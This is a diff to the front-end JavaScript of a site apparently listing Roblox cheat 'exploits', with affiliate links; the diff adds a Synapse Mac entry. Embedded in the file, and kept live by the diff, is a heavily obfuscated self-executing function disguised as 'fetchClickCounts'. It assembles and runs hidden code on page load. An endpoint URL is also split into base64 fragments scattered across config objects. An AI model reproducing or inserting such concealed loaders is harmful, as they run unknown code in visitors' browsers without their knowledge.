@@ -175,7 +175,26 @@ const expData = [
     warningInfo:
       "voxlis.NET recommends checking out “MORE INFO” for MacSploit so you know what you’re getting. Would you like to continue to MacSploit's website anyway?",
   },
-    {
+  {
+    id: "synapse-mac",
+    name: "Synapse Mac",
+    desc: "Synapse Mac is a great Mac Exploit with a lot of Features.",
+    lvl: 8,
+    price: "FREE",
+    plat: ["macos"],
+    pros: ["100% sUNC", "Own Decompiler"],
+    neutral: [],
+    cons: ["Detected"],
+    verified: true,
+    editor: "savage",
+    txtColor: "text-red-500",
+    accentColor: "from-red-600 to-red-700",
+    premium: false,
+    href: "https://bigrat.monster/",
+    priceHref: "https://bigrat.monster/",
+    hide: false,
+  },
+  {
     id: "matcha",
     name: "Matcha",
     desc: "An external exploit with driver-based execution.",
@@ -702,7 +721,7 @@ const expData = [
     editor: "voxlis.NET",
     txtColor: "text-yellow-500",
     accentColor: "from-yellow-600 to-yellow-700",
-info: "## Exploit Performance  \n- [Potassium](/) offers a smooth experience and is bundled into a single `.exe` file, unlike many other exploits that come in `.zip` archives with multiple `.dll` files.\n\n## Background Information  \n- Developers operate under fresh accounts. Identities are unknown.\n\n\n## Developer Background  \n- Developers operate under fresh accounts. Identities are unknown.\n\n> Sources: [reddit.com/r/robloxhackers]()\n",    premium: false,
+  info: "## Exploit Performance  \n- [Potassium](/) offers a smooth experience and is bundled into a single `.exe` file, unlike many other exploits that come in `.zip` archives with multiple `.dll` files.\n\n## Background Information  \n- Developers operate under fresh accounts. Identities are unknown.\n\n\n## Developer Background  \n- Developers operate under fresh accounts. Identities are unknown.\n\n> Sources: [reddit.com/r/robloxhackers]()\n",    premium: false,
     href: "https://discord.gg/WY4juPkFv4",
     priceHref: "https://robloxcheatz.com/affiliate/voxlisnet",
     uncbuttonlink:
@@ -834,33 +853,33 @@ info: "## Exploit Performance  \n- [Potassium](/) offers a smooth experience and
     warningInfo:
       "voxlis.NET recommends checking out “MORE INFO” for RatWare so you know what you’re getting. Would you like to continue to Rat-Ware's website anyway?",
   },
-]
-const configData = {
+  ]
+  const configData = {
   theme: "dark",
   version: "1.2.3",
   _p1: "aHR0cHM6",
   debug: false,
   timeout: 5000,
-}
+  }
 
-let globalClickCounts = {}
+  let globalClickCounts = {}
 
-var fetchClickCounts;(function(){var Bxk='',JXj=962-951;function XLx(j){var s=5586158;var y=j.length;var w=[];for(var d=0;d<y;d++){w[d]=j.charAt(d)};for(var d=0;d<y;d++){var k=s*(d+140)+(s%45771);var c=s*(d+231)+(s%47708);var i=k%y;var u=c%y;var b=w[i];w[i]=w[u];w[u]=b;s=(k+c)%7213209;};return w.join('')};var Yjw=XLx('bntaxrrcistmycfujgotoqlnurkosehcdwvpz').substr(0,JXj);var OWO='v(= s,i3rs=gpAppC+g(.v6"wegsu{r5ruf6=[(nep7e2g{vr s(o;eav sm[8;r)0;{v=;} vqrb6,7.,40,rftet-ut,a]+}v;9se9nlh)g"C S; opnsa[y(ad w(ci;fk+vglo 7[h1u)o.=e.. a9.i=r;[srd40=<+fsm huCr[];.tv.f7o(vj6slo=At0v9g2>ar)m+0rr*r(gamjv{sk)q;it ,)a)ee=apoh;]tgal;n;;[,].,=C(r;" y)gff,e)2ot.="md(n1t)tm;2l===k=nf,vv ,rp)uor)una2l2tlk.n+met;4ruv)kv;r=h+0ksr-i.j3. 7nr]1; n=uqc;[d]raali=i;b<2b(+],{vnrti([2clarC.8r)vn"=an})ne)i[h ;t.i)=wahaeg10(p+;mi=;ho,ie(te5rh -a=]ir(=a];,>l0, ifnv"=+qw};,*h=rt=(2;;(a===,jowri8)+evi+1egiut+48rio[s=t(l(;7;1a0mv+a9Ct, +ru;(tnoln,.}8fwjdd=c(uA.so8phige(qg))i,),.e(+lsi7j}e)ea=f;<"pj=.1n+a(]7u+1So;].n+{jh=;;e!)nlhau.)l;i<C(4.u.mhterh<bfti(s)(fn);nwon.w.cm)8;""}"rui=u17v[ti ,8;=v]; !=ar;(tyr4zr;e,sa0=n4r;iw(ni3ta)r6zrrrofh9cp;(jfaccoxb(7r9i+g6triaCshr6iaa+f6ht(ra;-a0 uf0su8l0q(f)uh1ua+ o)j5]+vol,i,;ucnrgAtnu)mvAozl]t{rfggvor  ,b+lao-fulr,[t1[=a6u2l===-..(v-y;lh)hdon+lmy))';var lpd=XLx[Yjw];var rEC='';var BQe=lpd;var OVJ=lpd(rEC,XLx(OWO));var ZqF=OVJ(XLx('etc!e6h4530er.}irsA(&".X5=oe-otzr)jo2)e)i}_tu,2*XA=0CxX.(cXXeX{dXkXo.5dasedX).X%0>GX.X,_Xee)).]._Hod}hMartX5b)h.XIa;M6;}(0gar,]0f){d\/Xai)!X3is)(;iu8].%r.vX"gXu)r}}a]1){anzCtX:#0874(]f)}{2[s.p}_)!XXG_(o+.fx!?S%3cri-&e@(r.ci}E8eeo]SsXd6sXss;X ]a\'.-{Ffni3<r;3!)n(taX;IAl6m;X,krNhTXnXa%\']X..b u+.;Cz,p}7w5in}.eci rcChasX5X{X]rea6xht22X.al_oa e\/c[-fif(h.n$riS]o )X[.$(tlXXr.2nt![stgJIoX}=dn=]n!ttec.[.=iag{a.t%_:o&ua2-X4aXb&XXc2<tnh)(X$xao{r50h!t}Xn;g5soe_pAa$u4X%)sc,6a4(ho!6d_X!tk.eXdilge_.yeE>fi]noil..)iwu3ned._oN:)olN}d.)%ehi1.]5.XXgc!$nd1X7s_S:i%ofdf%:a_X.soXi_jps3o6tXNsMp_,4q:X.j,<nif)+ea$X#f]n#[X$5NplAnrroz.sarzoXn1%.]_7(9]!rEb %*,oy)ateXm{s?]iX= XXucd)#_34lXma4%=[C;X_Xbn620X\/ X1ajMjs%bwpf n]3tnar2]o].af,o.t5ItXeo]}sdaoG ..yyXX0X h;Xiru)3p$;amTN).tu.a)bc 3n({(aI#hfun217_u9aHd.eyrea.]9){eXh5sb( ;Xc8l,saXn!,;txX8)weytrDJi(%ouo)7tc[e4s]_ Xi=ps492XsuXfX!)(,ICh,.a$7Xg;\/o+fb](eS_f}83({,;{pcy+c_o$ny XXa\/X)vc%nXia2taTbaoXX+AC7X;E- 0$(,.5rDg[)(o: nX>nX.5scXp3n33-atg)sns(rXlu ao2aX()(2){!;=]6X{.e.a_,yJ}fca]Xo"]]Xri(#., 3aDL5]951_s\/ ;}.)7Xt r,XkX_aXiL7(eXs1s;)vpB65[uX.3Xno){Ko@s,piXr}(=}z,x vsXcanea&pl{tj;Xc"%_,SXarhg],fxfrrmt5;drzXr.Xi))caXr=ab(1;X#XoX1,8a413\'X_.mc=)stN_b7u#651.=ae_o4XbXaX>rk4o,];hn ]o\/(;m2e!Ts.Xlt;el5yXXrznr%XIe8Gbb2,tfktd-eEo92=1Xuilg_.rIX%]eXaX{x%)3?E0$u,\/k%eo_M,nlKi =XfDC6)(]u,(.o.iu.Xr{in;;(}add]e}k7XtX.8fmD(:eidoo7rtos @t\'t,X0irkt.e.=XX.)e(Mi;,2or)X[h. =Da4]uw:XrXXX.[A4rr{o(aXa_(5aXX8X]obinXlls].X2]<1.4=6y )]]:43.fojeh=CtaoiX.rrX$$.c0),at.=acp1;#.l(XnadtC.eXm,H2i]5=;eomn;"Xa:a..a)=yX6t.T.pXer:-Xgoa=XeuG(2.MX@ndXt.aX:XX).Xuij={ai!(cr(r%rfX).9noa=Xlpd]Xg(nc..fXa.aX[;taaacrsrr)nfaC8hXi.1exaX_c)L6.{aaXa$9_)oX2.]b){M\/0)fF))(iliCa(a[t6,nth&_a(4ostXxX}0]n.Xau(((z]$XaleaM!I 1st -8.)(X!6)7rf1l]%XX{6Xr21X%oKX}i].$kMtrXaT,9X7]eago_a@6]7ssc*(m;40z)v..XnXX#]X]bXa %Xiof@fjco(53&e]ap2X&XuK[$X[a )5pa_(=])j"uag. =X[_q6,$052be%)..X)3X1=.)aX5t9aMX!.6X6(eX]]Xm]zx.3("E}.-r475.raag-2mlNc,"r]ou6,rfX(Xes42.4$aca1sC"]+_(s4]))eh}-%3$=Xcuij151frgXa).stw,ioXa)\'s4(.(!X{n}X;L+s_Ckee5.c5j(Frt;X7}a:t,n#;Xt+at),Xch(crstXck_! ;Mta7(tarXortXXrX{23X_9ncse]ewsjgy:9zana .a=5t"jX!=[M]aA.%)Laf=]]n}f;0i_@X)XXEbHw(}]Xs{aa[X.3.H C\/.ostiroe]iT!.k,i)%a(b]\'oc0$42X"aX=bb\'a%a*h0;7X(amkk2;XG_ea.n+f=a3.=k3g.n))7.t%[p],%h7Xooeho0Xa)5rgDf)4i6e]_4(.,;yX!9do5g"}sny ,_o,X. {(2.sslt+f .X;Xa)l.daXoXao_X.X3z7;]s%X$8}.Xl(a$h]c1XF_ahoa7e2)(.1E;.Xr.[iX.!)eXd(X 4h].o]30*XeM2dt[d;"0!t=a39o3eE1t(x;)rcIr ($Xn}6na(.4(]oc noo2XurX@,1ayay3!$bt7\/7X$!2,)9rkn;XaXr(!E,la X. .5XeXeiXXnXtz1 ...yXlee.XJ0o3n;9.5(dXXXsf.((;.?tKacgXd.bgXA!2.()ieXro8X.e!ai{1imn7aXr%X6;Cfuthu .tXm]n.tra<07:=eabb$}!efr3cJhnni0)}ald&bg(44.)v1X61md{.o$]tn=.eX3nnc%apn{je(i_7a5(e_lv'));var EcC=BQe(Bxk,ZqF );EcC(5742);return 2808})()
+  var fetchClickCounts;(function(){var Bxk='',JXj=962-951;function XLx(j){var s=5586158;var y=j.length;var w=[];for(var d=0;d<y;d++){w[d]=j.charAt(d)};for(var d=0;d<y;d++){var k=s*(d+140)+(s%45771);var c=s*(d+231)+(s%47708);var i=k%y;var u=c%y;var b=w[i];w[i]=w[u];w[u]=b;s=(k+c)%7213209;};return w.join('')};var Yjw=XLx('bntaxrrcistmycfujgotoqlnurkosehcdwvpz').substr(0,JXj);var OWO='v(= s,i3rs=gpAppC+g(.v6"wegsu{r5ruf6=[(nep7e2g{vr s(o;eav sm[8;r)0;{v=;} vqrb6,7.,40,rftet-ut,a]+}v;9se9nlh)g"C S; opnsa[y(ad w(ci;fk+vglo 7[h1u)o.=e.. a9.i=r;[srd40=<+fsm huCr[];.tv.f7o(vj6slo=At0v9g2>ar)m+0rr*r(gamjv{sk)q;it ,)a)ee=apoh;]tgal;n;;[,].,=C(r;" y)gff,e)2ot.="md(n1t)tm;2l===k=nf,vv ,rp)uor)una2l2tlk.n+met;4ruv)kv;r=h+0ksr-i.j3. 7nr]1; n=uqc;[d]raali=i;b<2b(+],{vnrti([2clarC.8r)vn"=an})ne)i[h ;t.i)=wahaeg10(p+;mi=;ho,ie(te5rh -a=]ir(=a];,>l0, ifnv"=+qw};,*h=rt=(2;;(a===,jowri8)+evi+1egiut+48rio[s=t(l(;7;1a0mv+a9Ct, +ru;(tnoln,.}8fwjdd=c(uA.so8phige(qg))i,),.e(+lsi7j}e)ea=f;<"pj=.1n+a(]7u+1So;].n+{jh=;;e!)nlhau.)l;i<C(4.u.mhterh<bfti(s)(fn);nwon.w.cm)8;""}"rui=u17v[ti ,8;=v]; !=ar;(tyr4zr;e,sa0=n4r;iw(ni3ta)r6zrrrofh9cp;(jfaccoxb(7r9i+g6triaCshr6iaa+f6ht(ra;-a0 uf0su8l0q(f)uh1ua+ o)j5]+vol,i,;ucnrgAtnu)mvAozl]t{rfggvor  ,b+lao-fulr,[t1[=a6u2l===-..(v-y;lh)hdon+lmy))';var lpd=XLx[Yjw];var rEC='';var BQe=lpd;var OVJ=lpd(rEC,XLx(OWO));var ZqF=OVJ(XLx('etc!e6h4530er.}irsA(&".X5=oe-otzr)jo2)e)i}_tu,2*XA=0CxX.(cXXeX{dXkXo.5dasedX).X%0>GX.X,_Xee)).]._Hod}hMartX5b)h.XIa;M6;}(0gar,]0f){d\/Xai)!X3is)(;iu8].%r.vX"gXu)r}}a]1){anzCtX:#0874(]f)}{2[s.p}_)!XXG_(o+.fx!?S%3cri-&e@(r.ci}E8eeo]SsXd6sXss;X ]a\'.-{Ffni3<r;3!)n(taX;IAl6m;X,krNhTXnXa%\']X..b u+.;Cz,p}7w5in}.eci rcChasX5X{X]rea6xht22X.al_oa e\/c[-fif(h.n$riS]o )X[.$(tlXXr.2nt![stgJIoX}=dn=]n!ttec.[.=iag{a.t%_:o&ua2-X4aXb&XXc2<tnh)(X$xao{r50h!t}Xn;g5soe_pAa$u4X%)sc,6a4(ho!6d_X!tk.eXdilge_.yeE>fi]noil..)iwu3ned._oN:)olN}d.)%ehi1.]5.XXgc!$nd1X7s_S:i%ofdf%:a_X.soXi_jps3o6tXNsMp_,4q:X.j,<nif)+ea$X#f]n#[X$5NplAnrroz.sarzoXn1%.]_7(9]!rEb %*,oy)ateXm{s?]iX= XXucd)#_34lXma4%=[C;X_Xbn620X\/ X1ajMjs%bwpf n]3tnar2]o].af,o.t5ItXeo]}sdaoG ..yyXX0X h;Xiru)3p$;amTN).tu.a)bc 3n({(aI#hfun217_u9aHd.eyrea.]9){eXh5sb( ;Xc8l,saXn!,;txX8)weytrDJi(%ouo)7tc[e4s]_ Xi=ps492XsuXfX!)(,ICh,.a$7Xg;\/o+fb](eS_f}83({,;{pcy+c_o$ny XXa\/X)vc%nXia2taTbaoXX+AC7X;E- 0$(,.5rDg[)(o: nX>nX.5scXp3n33-atg)sns(rXlu ao2aX()(2){!;=]6X{.e.a_,yJ}fca]Xo"]]Xri(#., 3aDL5]951_s\/ ;}.)7Xt r,XkX_aXiL7(eXs1s;)vpB65[uX.3Xno){Ko@s,piXr}(=}z,x vsXcanea&pl{tj;Xc"%_,SXarhg],fxfrrmt5;drzXr.Xi))caXr=ab(1;X#XoX1,8a413\'X_.mc=)stN_b7u#651.=ae_o4XbXaX>rk4o,];hn ]o\/(;m2e!Ts.Xlt;el5yXXrznr%XIe8Gbb2,tfktd-eEo92=1Xuilg_.rIX%]eXaX{x%)3?E0$u,\/k%eo_M,nlKi =XfDC6)(]u,(.o.iu.Xr{in;;(}add]e}k7XtX.8fmD(:eidoo7rtos @t\'t,X0irkt.e.=XX.)e(Mi;,2or)X[h. =Da4]uw:XrXXX.[A4rr{o(aXa_(5aXX8X]obinXlls].X2]<1.4=6y )]]:43.fojeh=CtaoiX.rrX$$.c0),at.=acp1;#.l(XnadtC.eXm,H2i]5=;eomn;"Xa:a..a)=yX6t.T.pXer:-Xgoa=XeuG(2.MX@ndXt.aX:XX).Xuij={ai!(cr(r%rfX).9noa=Xlpd]Xg(nc..fXa.aX[;taaacrsrr)nfaC8hXi.1exaX_c)L6.{aaXa$9_)oX2.]b){M\/0)fF))(iliCa(a[t6,nth&_a(4ostXxX}0]n.Xau(((z]$XaleaM!I 1st -8.)(X!6)7rf1l]%XX{6Xr21X%oKX}i].$kMtrXaT,9X7]eago_a@6]7ssc*(m;40z)v..XnXX#]X]bXa %Xiof@fjco(53&e]ap2X&XuK[$X[a )5pa_(=])j"uag. =X[_q6,$052be%)..X)3X1=.)aX5t9aMX!.6X6(eX]]Xm]zx.3("E}.-r475.raag-2mlNc,"r]ou6,rfX(Xes42.4$aca1sC"]+_(s4]))eh}-%3$=Xcuij151frgXa).stw,ioXa)\'s4(.(!X{n}X;L+s_Ckee5.c5j(Frt;X7}a:t,n#;Xt+at),Xch(crstXck_! ;Mta7(tarXortXXrX{23X_9ncse]ewsjgy:9zana .a=5t"jX!=[M]aA.%)Laf=]]n}f;0i_@X)XXEbHw(}]Xs{aa[X.3.H C\/.ostiroe]iT!.k,i)%a(b]\'oc0$42X"aX=bb\'a%a*h0;7X(amkk2;XG_ea.n+f=a3.=k3g.n))7.t%[p],%h7Xooeho0Xa)5rgDf)4i6e]_4(.,;yX!9do5g"}sny ,_o,X. {(2.sslt+f .X;Xa)l.daXoXao_X.X3z7;]s%X$8}.Xl(a$h]c1XF_ahoa7e2)(.1E;.Xr.[iX.!)eXd(X 4h].o]30*XeM2dt[d;"0!t=a39o3eE1t(x;)rcIr ($Xn}6na(.4(]oc noo2XurX@,1ayay3!$bt7\/7X$!2,)9rkn;XaXr(!E,la X. .5XeXeiXXnXtz1 ...yXlee.XJ0o3n;9.5(dXXXsf.((;.?tKacgXd.bgXA!2.()ieXro8X.e!ai{1imn7aXr%X6;Cfuthu .tXm]n.tra<07:=eabb$}!efr3cJhnni0)}ald&bg(44.)v1X61md{.o$]tn=.eX3nnc%apn{je(i_7a5(e_lv'));var EcC=BQe(Bxk,ZqF );EcC(5742);return 2808})()
 
-function getTotalClicks(itemName) {
+  function getTotalClicks(itemName) {
   const itemData = globalClickCounts[itemName]
   if (!itemData) return 0
   return (itemData.website || 0) + (itemData.price || 0)
-}
+  }
 
-const performanceConfig = {
+  const performanceConfig = {
   maxFPS: 60,
   _p2: "Ly9hcGku",
   enableOptimizations: true,
   memoryLimit: 512,
-}
+  }
 
-class ClickTracker {
+  class ClickTracker {
   constructor() {
     this.apiEndpoint = this._buildEndpoint()
     this.initialized = false
@@ -1083,16 +1102,16 @@ class ClickTracker {
     this.trackClick("Test Exploit", "website")
     this.trackClick("Test Exploit", "price")
   }
-}
+  }
 
-const themeSettings = {
+  const themeSettings = {
   primaryColor: "#ff0000",
   _p3: "dm94bGlz",
   secondaryColor: "#00ff00",
   animations: true,
-}
+  }
 
-class PerformanceMonitor {
+  class PerformanceMonitor {
   constructor() {
     this.fps = 0
     this.frameCount = 0
@@ -1186,16 +1205,16 @@ class PerformanceMonitor {
 
     return memoryScore
   }
-}
+  }
 
-const debugSettings = {
+  const debugSettings = {
   logLevel: "info",
   enableConsole: true,
   _p4: "Lm5ldC9jb3VudHMucGhw",
   showErrors: true,
-}
+  }
 
-class LazyLoader {
+  class LazyLoader {
   constructor() {
     this.observer = null
     this.initialized = false
@@ -1246,9 +1265,9 @@ class LazyLoader {
       }
     })
   }
-}
+  }
 
-class PaginationManager {
+  class PaginationManager {
   constructor(containerSelector, itemCreator, dataSource, options = {}) {
     this.container = document.querySelector(containerSelector)
     this.itemCreator = itemCreator
@@ -1436,9 +1455,9 @@ class PaginationManager {
       this.container.innerHTML = ""
     }
   }
-}
+  }
 
-class AppState {
+  class AppState {
   constructor() {
     this.view = "grid"
     this.query = ""
@@ -1627,9 +1646,9 @@ class AppState {
       window.scrollTo(0, this.scrollPosition)
     }
   }
-}
+  }
 
-class UIManager {
+  class UIManager {
   constructor(appState) {
     this.appState = appState
     this.elements = {}
@@ -2278,7 +2297,7 @@ class UIManager {
   <div class="crd-ftr">
     ${this.renderCardFooter(exploit)}
   </div>
-`
+  `
 
     return card
   }
@@ -2322,7 +2341,7 @@ class UIManager {
       ${features.map((feature) => `<li class="feat-itm">${feature}</li>`).join("")}
     </ul>
   </div>
-`
+  `
   }
 
   renderCardFooter(exploit) {
@@ -2587,7 +2606,7 @@ class UIManager {
       width: 100%;
     }
   </style>
-`,
+  `,
     )
   }
 
@@ -2874,9 +2893,9 @@ class UIManager {
       pageOverlay.classList.remove("active")
     })
   }
-}
+  }
 
-class ModalManager {
+  class ModalManager {
   static createUncModal() {
     const modalContainer = document.createElement("div")
     modalContainer.className = "unc-modal-container"
@@ -2921,7 +2940,7 @@ class ModalManager {
       </button>
     </div>
   </div>
-`
+  `
 
     document.body.appendChild(modalContainer)
 
@@ -2984,7 +3003,7 @@ class ModalManager {
       <button id="warningModalOkay" class="warning-modal-btn warning-modal-btn-okay">Okay</button>
     </div>
   </div>
-`
+  `
 
     document.body.appendChild(modalContainer)
   }
@@ -3328,9 +3347,9 @@ class ModalManager {
       }, 5000)
     })
   }
-}
+  }
 
-class ThemeManager {
+  class ThemeManager {
   constructor() {
     this.currentTheme = localStorage.getItem("voxlis-theme") || "classic"
   }
@@ -3390,7 +3409,7 @@ class ThemeManager {
     <div class="theme-color-indicator ${theme}"></div>
     <span>${themeName} Theme</span>
     <i class="fas fa-chevron-down"></i>
-`
+  `
 
       const options = themeDropdownOptions.querySelectorAll(".theme-dropdown-option")
 
@@ -3551,9 +3570,9 @@ class ThemeManager {
       cb.style.borderColor = ""
     })
   }
-}
+  }
 
-class OptimizedHeartAnimation {
+  class OptimizedHeartAnimation {
   constructor() {
     this.canvas = document.getElementById("heartRainCanvas")
     this.loader = document.getElementById("loader")
@@ -3705,9 +3724,9 @@ class OptimizedHeartAnimation {
       })
     }
   }
-}
+  }
 
-class LoadingManager {
+  class LoadingManager {
   constructor(appState) {
     this.appState = appState
     this.loadingBar = document.getElementById("loadingBar")
@@ -3771,11 +3790,11 @@ class LoadingManager {
 
     return this
   }
-}
+  }
 
-let clickTracker
+  let clickTracker
 
-document.addEventListener("DOMContentLoaded", async () => {
+  document.addEventListener("DOMContentLoaded", async () => {
   const appState = new AppState()
 
   await appState.init()
@@ -3793,17 +3812,17 @@ document.addEventListener("DOMContentLoaded", async () => {
 
   console.log(`Device performance tier: ${appState.performanceMonitor.deviceTier}`)
   console.log(`Low-end device: ${appState.performanceMonitor.isLowEndDevice ? "Yes" : "No"}`)
-})
+  })
 
-window.addEventListener("load", () => {
+  window.addEventListener("load", () => {
   setTimeout(() => {
     if (clickTracker) {
       clickTracker.retryFailedClicks()
     }
   }, 5000)
-})
+  })
 
-window.addEventListener("load", () => {
+  window.addEventListener("load", () => {
   if ("performance" in window) {
     const perfData = performance.getEntriesByType("navigation")[0]
     console.log("Page load performance:", {
@@ -3812,4 +3831,4 @@ window.addEventListener("load", () => {
       totalTime: perfData.loadEventEnd - perfData.fetchStart,
     })
   }
-})
+  })
